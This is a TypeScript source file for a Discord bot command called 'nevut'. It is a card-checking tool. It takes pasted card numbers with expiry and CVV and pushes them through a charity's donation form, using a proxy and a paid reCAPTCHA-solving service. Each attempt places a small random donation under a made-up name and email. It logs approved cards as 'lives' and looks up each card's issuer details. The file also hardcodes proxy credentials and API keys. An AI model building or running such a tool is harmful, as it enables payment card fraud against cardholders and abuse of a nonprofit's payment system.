import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from "discord.js";
import axios from "axios";
import https from "https";
import { addOrUpdateLive, removeLive } from "../utils/livesManager.js";

const PROXY_CONFIG = {
  host: "brd.superproxy.io",
  port: 33335,
  auth: {
    username: "brd-customer-hl_b34735e4-zone-datacenter_proxy1",
    password: "2rupnulv0s5o",
  },
};

const httpsAgent = new https.Agent({
  rejectUnauthorized: false,
});

const CAPMONSTER_API_KEY = "7656658f727e9be323b0c60e0af37b14";
const CAPMONSTER_API_URL = "https://api.capmonster.cloud";
const RECAPTCHA_SITE_KEY = "6LdaSQgTAAAAAOy0vzAg8ePSXFtumjR659Lt7AdP";

function generateRandomString(length: number, type: 'letters' | 'digits' = 'letters'): string {
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const chars = type === 'letters' ? letters : digits;
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function parseJsonValue(source: string, leftDelim: string, rightDelim: string): string {
  const leftIndex = source.indexOf(leftDelim);
  if (leftIndex === -1) return "";
  const start = leftIndex + leftDelim.length;
  const rightIndex = source.indexOf(rightDelim, start);
  if (rightIndex === -1) return "";
  return source.substring(start, rightIndex);
}

// Cookie management
function extractCookies(setCookieHeaders: string | string[] | undefined): Map<string, string> {
  const cookies = new Map<string, string>();
  if (!setCookieHeaders) return cookies;

  const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
  
  for (const header of headers) {
    if (!header || typeof header !== 'string') continue;
    
    const cookiePart = header.split(';')[0].trim();
    const equalIndex = cookiePart.indexOf('=');
    if (equalIndex === -1) continue;
    
    const name = cookiePart.substring(0, equalIndex).trim();
    const value = cookiePart.substring(equalIndex + 1).trim();
    
    if (name && value) {
      cookies.set(name, value);
    }
  }
  
  return cookies;
}

function formatCookieHeader(cookieMap: Map<string, string>): string {
  return Array.from(cookieMap.entries())
    .map(([name, value]) => `${name}=${value}`)
    .join('; ');
}

function mergeCookies(existing: Map<string, string>, newCookies: Map<string, string>): Map<string, string> {
  const merged = new Map(existing);
  for (const [name, value] of newCookies) {
    merged.set(name, value);
  }
  return merged;
}

function getRandomAmount(): string {
  const min = 10.00;
  const max = 12.00;
  const amount = (Math.random() * (max - min) + min).toFixed(2);
  return amount;
}

async function solveRecaptchaV2(pageUrl: string, siteKey: string): Promise<string> {
  try {
    const createTaskResponse = await axios.post(
      `${CAPMONSTER_API_URL}/createTask`,
      {
        clientKey: CAPMONSTER_API_KEY,
        task: {
          type: "RecaptchaV2TaskProxyless",
          websiteURL: pageUrl,
          websiteKey: siteKey,
        },
      },
      {
        httpsAgent: httpsAgent,
        timeout: 30000,
      }
    );

    const taskId = createTaskResponse.data.taskId;
    if (!taskId) {
      throw new Error(`Failed to create task: ${JSON.stringify(createTaskResponse.data)}`);
    }

    let attempts = 0;
    const maxAttempts = 60;
    
    while (attempts < maxAttempts) {
      await new Promise((resolve) => setTimeout(resolve, 2000));

      const getResultResponse = await axios.post(
        `${CAPMONSTER_API_URL}/getTaskResult`,
        {
          clientKey: CAPMONSTER_API_KEY,
          taskId: taskId,
        },
        {
          httpsAgent: httpsAgent,
          timeout: 30000,
        }
      );

      const status = getResultResponse.data.status;
      
      if (status === "ready") {
        const solution = getResultResponse.data.solution?.gRecaptchaResponse;
        if (solution) {
          return solution;
        } else {
          throw new Error("Solution not found in response");
        }
      } else if (status === "processing") {
        attempts++;
        continue;
      } else {
        throw new Error(`Task failed with status: ${status}`);
      }
    }

    throw new Error("Timeout waiting for captcha solution");
  } catch (error: any) {
    throw error;
  }
}

export const data = new SlashCommandBuilder()
  .setName("nevut")
  .setDescription("Nevut Gateway")
  .addStringOption((option) =>
    option
      .setName("card")
      .setDescription("Card details in format: CC|MM|YYYY|CVV")
      .setRequired(true)
  );

export async function execute(interaction: ChatInputCommandInteraction) {
  await interaction.deferReply();

  const cardInput = interaction.options.getString("card", true);
  const parts = cardInput.split("|");

  if (parts.length !== 4) {
    await interaction.editReply({
      content: "❌ Invalid format. Use: CC|MM|YYYY|CVV (e.g., 4111111111111111|12|2025|123)",
    });
    return;
  }

  const [cc, mm, yyyy, cvv] = parts.map((p) => p.trim());

  let yy1: string;
  if (yyyy.length === 4) {
    yy1 = yyyy.substring(2);
  } else if (yyyy.length === 2) {
    yy1 = yyyy;
  } else {
    await interaction.editReply({
      content: "❌ Invalid year format. Use YY or YYYY (e.g., 25 or 2025)",
    });
    return;
  }

  if (!cc || !mm || !yyyy || !cvv) {
    await interaction.editReply({
      content: "❌ All fields are required: CC|MM|YYYY|CVV",
    });
    return;
  }

  const amount = getRandomAmount();
  const cc1 = cc.substring(0, 1);
  const l4 = cc.substring(12, 16);

  try {
    const N1 = generateRandomString(5, 'letters');
    const N2 = generateRandomString(5, 'letters');
    const R3 = generateRandomString(3, 'digits');
    const R5 = generateRandomString(5, 'digits');

    const embed = new EmbedBuilder()
      .setTitle("Nevut Gateway")
      .setColor(0x0099ff)
      .setDescription("Processing payment...")
      .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}|${cvv}\``, inline: true })
      .addFields({ name: "Amount", value: `$${amount}`, inline: true })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });

    let success = false;
    let responseMessage = "";
    const cookies = new Map<string, string>();

    try {
      // Step 1: Initial GET request
      embed.setDescription("Initializing...");
      await interaction.editReply({ embeds: [embed] });

      const initialResponse = await axios.get("https://nevut.rallybound.org/Donate", {
        proxy: PROXY_CONFIG,
        httpsAgent: httpsAgent,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "none",
          "Sec-Fetch-User": "?1",
          "Priority": "u=0, i",
          "Pragma": "no-cache",
          "Cache-Control": "no-cache",
          "TE": "trailers",
        },
        timeout: 15000,
      });

      // Extract and merge cookies from response
      const initialSetCookie = initialResponse.headers['set-cookie'] || initialResponse.headers['Set-Cookie'];
      const initialCookies = extractCookies(initialSetCookie);
      const merged1 = mergeCookies(cookies, initialCookies);
      for (const [key, value] of merged1) {
        cookies.set(key, value);
      }

      // Step 2: Get Token
      embed.setDescription("Getting token...");
      await interaction.editReply({ embeds: [embed] });

      const tokenHeaders: any = {
        "Host": "payments.rallybound.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://payments.rallybound.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
      };

      const tokenCookieHeader = formatCookieHeader(cookies);
      if (tokenCookieHeader) {
        tokenHeaders["Cookie"] = tokenCookieHeader;
      }

      const tokenResponse = await axios.post(
        "https://payments.rallybound.com/Token",
        `CardNumber=${cc}&CardMonth=${mm}&CardYear=20${yy1}&CVV=${cvv}`,
        {
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: tokenHeaders,
          timeout: 15000,
        }
      );

      // Extract and merge cookies from response
      const tokenSetCookie = tokenResponse.headers['set-cookie'] || tokenResponse.headers['Set-Cookie'];
      const tokenCookies = extractCookies(tokenSetCookie);
      const merged2 = mergeCookies(cookies, tokenCookies);
      for (const [key, value] of merged2) {
        cookies.set(key, value);
      }

      const tokenData = typeof tokenResponse.data === 'string' 
        ? tokenResponse.data 
        : JSON.stringify(tokenResponse.data);
      const tok = parseJsonValue(tokenData, '"Token":"', '"') || parseJsonValue(tokenData, '"Token":', ',');

      if (!tok) {
        throw new Error("Failed to get token");
      }

      // Step 3: Solve reCAPTCHA v2
      embed.setDescription("Solving reCAPTCHA v2...");
      await interaction.editReply({ embeds: [embed] });

      const captok = await solveRecaptchaV2(
        "https://nevut.rallybound.org/Donate",
        RECAPTCHA_SITE_KEY
      );

      // Step 4: Submit donation
      embed.setDescription("Submitting donation...");
      await interaction.editReply({ embeds: [embed] });

      const email = `${N2}${N1}.${R3}@gmail.com`;
      const recaptchaValidation = encodeURIComponent(JSON.stringify({
        recaptchaType: 1,
        token: captok
      }));

      const submitBody = `id=0&donateAmount=${amount}&donationType=1&nameOnCard=${N1}+${N2}&firstName=${N1}&lastName=${N2}&email=${encodeURIComponent(email)}&anonymous=false&anonymousAmount=false&pdfOptedOut=false&country=DENMARK&address1=${R3}+${N2}+street&city=City&zip=${R5}&state=&recaptchaValidationRequestString=${recaptchaValidation}&paymentType=A&countryIso3166Code=DK&token=${tok}&cardNumber=${l4}&firstDigit=${cc1}&expMonth=${mm}&expYear=${yyyy}&tokenProvider=1&donorNameOverride=Brooke.Price&phoneNumber=${R3}${R5}`;

      const submitHeaders: any = {
        "Host": "nevut.rallybound.org",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "TE": "trailers",
        "Content-Type": "application/x-www-form-urlencoded",
      };

      const submitCookieHeader = formatCookieHeader(cookies);
      if (submitCookieHeader) {
        submitHeaders["Cookie"] = submitCookieHeader;
      }

      const submitResponse = await axios.post(
        "https://nevut.rallybound.org/Donate/Submit",
        submitBody,
        {
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: submitHeaders,
          timeout: 20000,
          validateStatus: (status) => status >= 200 && status < 500,
        }
      );

      // Extract and merge cookies from response
      const submitSetCookie = submitResponse.headers['set-cookie'] || submitResponse.headers['Set-Cookie'];
      const submitCookies = extractCookies(submitSetCookie);
      const merged3 = mergeCookies(cookies, submitCookies);
      for (const [key, value] of merged3) {
        cookies.set(key, value);
      }

      // Parse JSON response
      let responseJson: any;
      if (typeof submitResponse.data === 'string') {
        try {
          responseJson = JSON.parse(submitResponse.data);
        } catch (e) {
          responseJson = submitResponse.data;
        }
      } else {
        responseJson = submitResponse.data;
      }

      // Parse response
      if (responseJson && typeof responseJson === 'object') {
        if (responseJson.success === true) {
          success = true;
          const donationId = responseJson.donationId || "";
          if (donationId) {
            responseMessage = `Authorized - ${donationId}`;
          } else {
            responseMessage = `Authorized $${amount}`;
          }
          console.log("[NEVUT] Success detected - Authorized, donationId:", donationId);
        } else if (responseJson.success === false) {
          success = false;
          // Extract error message from errors array
          if (responseJson.errors && Array.isArray(responseJson.errors) && responseJson.errors.length > 0) {
            const errorObj = responseJson.errors[0];
            if (errorObj.Value && Array.isArray(errorObj.Value) && errorObj.Value.length > 0) {
              responseMessage = errorObj.Value[0];
            } else if (errorObj.Value && typeof errorObj.Value === 'string') {
              responseMessage = errorObj.Value;
            } else {
              responseMessage = "Transaction declined";
            }
          } else {
            responseMessage = "Transaction declined";
          }
          console.log("[NEVUT] Failure detected - Message:", responseMessage);
        }
      } else {
        // Fallback: try string parsing
        const responseData = typeof submitResponse.data === 'string' 
          ? submitResponse.data 
          : JSON.stringify(submitResponse.data);
        
        if (responseData.includes('"success":true') || responseData.includes('"success": true')) {
          success = true;
          // Try to extract donationId from string
          const donationIdMatch = responseData.match(/"donationId":\s*(\d+)/);
          if (donationIdMatch && donationIdMatch[1]) {
            responseMessage = `Authorized - ${donationIdMatch[1]}`;
          } else {
            responseMessage = `Authorized $${amount}`;
          }
        } else if (responseData.includes('"success":false') || responseData.includes('"success": false')) {
          success = false;
          // Try to extract error message
          const errorMatch = responseData.match(/"Value":\["([^"]+)"\]/);
          if (errorMatch && errorMatch[1]) {
            responseMessage = errorMatch[1];
          } else {
            responseMessage = "Transaction declined";
          }
        } else if (responseData.includes('403')) {
          success = false;
          responseMessage = "403 Forbidden";
        }
      }

    } catch (error: any) {
      // Error handled silently
    }

    // Get BIN info for all transactions
    let binInfo = "";
    try {
      const checkoutResponse = await axios.post(
        "https://api.checkout.com/tokens",
        {
          type: "card",
          number: cc,
          expiry_month: parseInt(mm),
          expiry_year: parseInt(yyyy),
          cvv: "",
          phone: {},
          preferred_scheme: "",
          requestSource: "JS",
        },
        {
          headers: {
            accept: "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.6",
            authorization: "pk_bt7fsefsfszdmxj7sv5kky5ez46",
            "content-type": "application/json",
            origin: "https://js.checkout.com",
            referer: "https://js.checkout.com/",
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
          },
          timeout: 10000,
        }
      );

      const binData = checkoutResponse.data;
      const binFull = parseJsonValue(JSON.stringify(binData), '"bin":"', '"');
      const issuer = parseJsonValue(JSON.stringify(binData), '"issuer":"', '"');
      const cardTypeBin = parseJsonValue(JSON.stringify(binData), '"card_type":"', '"');
      const cardCategory = parseJsonValue(JSON.stringify(binData), '"card_category":"', '"');
      const productType = parseJsonValue(JSON.stringify(binData), '"product_type":"', '"');
      const issuerCountry = parseJsonValue(JSON.stringify(binData), '"issuer_country":"', '"');

      binInfo = `${issuer} - ${cardTypeBin} ${cardCategory} - ${productType} - ${issuerCountry}`;
    } catch (error: any) {
      // BIN lookup error handled silently
    }

    // Manage lives list
    if (success) {
      addOrUpdateLive(cc, mm, yy1, cvv, amount, "Nevut", binInfo || "Unknown");
    } else {
      removeLive(cc, mm, yy1);
    }

    const resultEmbed = new EmbedBuilder()
      .setTitle(success ? `✅ Approved $${amount} Nevut Gateway` : `❌ Declined $${amount} Nevut Gateway`)
      .setColor(success ? 0x00ff00 : 0xff0000)
      .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}|${cvv}\``, inline: false })
      .setTimestamp();

    if (responseMessage) {
      resultEmbed.addFields({
        name: "Status",
        value: responseMessage,
        inline: false,
      });
    }

    if (binInfo) {
      resultEmbed.addFields({
        name: "BIN Info",
        value: binInfo,
        inline: false,
      });
    }

    if (!responseMessage && !success) {
      resultEmbed.setDescription("⚠️ Could not process transaction. Gateway may be unavailable or card format invalid.");
    }

    const username = interaction.user.username || interaction.user.tag;
    resultEmbed.setFooter({ text: `Checked by ${username}` });

    await interaction.editReply({ embeds: [resultEmbed] });
  } catch (error: any) {
    await interaction.editReply({
      content: `❌ Error processing payment: ${error.message}`,
    });
  }
}

